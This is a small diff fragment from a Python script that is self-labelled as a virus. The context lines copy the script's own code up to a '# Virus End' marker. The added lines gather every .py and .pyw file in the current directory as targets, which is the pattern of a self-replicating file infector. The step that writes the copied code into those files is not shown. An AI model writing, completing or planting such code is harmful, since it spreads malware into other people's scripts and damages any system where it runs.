@@ -14,3 +14,7 @@ for line in lines:
         code.append(line)
     if line == "# Virus End\n":
         break
+
+python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
+
+# Virus End
